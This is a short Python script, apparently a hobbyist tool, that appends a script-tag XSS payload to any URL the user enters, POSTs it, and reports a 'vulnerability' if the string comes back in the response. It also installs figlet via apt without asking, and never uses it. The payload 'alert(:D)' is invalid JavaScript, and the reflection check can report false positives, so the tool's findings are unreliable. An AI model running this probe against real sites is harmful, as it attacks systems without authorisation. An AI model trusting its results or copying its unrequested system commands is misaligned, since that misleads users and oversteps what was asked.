import os, requests, time
from colorama import Fore
os.system("apt install figlet")
os.system("clear")
print(Fore.CYAN + """
   _  __              _______           __
  | |/ /__________   / ____(_)___  ____/ /
  |   // ___/ ___/  / /_  / / __ \/ __  / 
 /   |(__  |__  )  / __/ / / / / / /_/ /  
/_/|_/____/____/  /_/   /_/_/ /_/\__,_/
""")
print(Fore.RED + "Web URL XSS test script\n")
print(Fore.BLUE + "Author = Saep\n")
print(Fore.GREEN + "Version 0.1\n")

payload = "<script>alert(:D)</script>"
url = input("Target Url: ")
req = requests.post(url + payload)
if payload in req.text:
	print(Fore.RED + "\nXSS Vulnerability Founded!\n")
	print(Fore.RED + "\nPayload: <script>alert(:D)</script>\n")
else:
	print(Fore.RED + "\nPayload Unsuccesful.")
